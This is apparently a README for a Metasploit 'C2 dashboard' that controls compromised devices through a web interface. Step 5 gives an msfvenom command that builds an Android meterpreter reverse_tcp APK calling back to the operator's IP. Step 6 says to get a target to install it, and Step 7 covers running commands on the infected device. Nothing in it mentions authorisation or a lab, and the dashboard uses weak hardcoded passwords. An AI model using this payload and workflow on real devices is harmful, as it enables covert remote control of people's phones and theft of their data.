# Metasploit C2 Dashboard

Simple working dashboard for Metasploit penetration testing.

## Installation

```bash
./install.sh
```

## Usage

### Step 1: Start Metasploit RPC
```bash
msfrpcd -P msf_password -a 127.0.0.1
```

### Step 2: Start Dashboard
```bash
python3 server.py
```

### Step 3: Open Browser
```
http://localhost:5000
Password: admin
```

### Step 4: Configure Handler
- Enter LHOST (your IP)
- Enter LPORT (default: 4444)
- Select PAYLOAD
- Click START HANDLER

### Step 5: Create Payload
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.apk
```

### Step 6: Install on Target
- Transfer payload.apk to target device
- Install and run
- Target appears in dashboard

### Step 7: Control Session
- Click on target in table
- Use quick commands or type custom commands
- Execute commands on target

## Files
- `server.py` - Backend server
- `templates/login.html` - Login page
- `templates/dashboard.html` - Main dashboard
- `install.sh` - Installation script

## Troubleshooting

**Dashboard won't start:**
```bash
pip3 install --user Flask pymetasploit3
```

**Cannot connect to MSF:**
```bash
# Check msfrpcd is running:
ps aux | grep msfrpcd

# Restart if needed:
msfrpcd -P msf_password -a 127.0.0.1
```

**No sessions appearing:**
- Make sure Handler is started
- Check target has network connection
- Verify LHOST is correct IP (not 0.0.0.0)
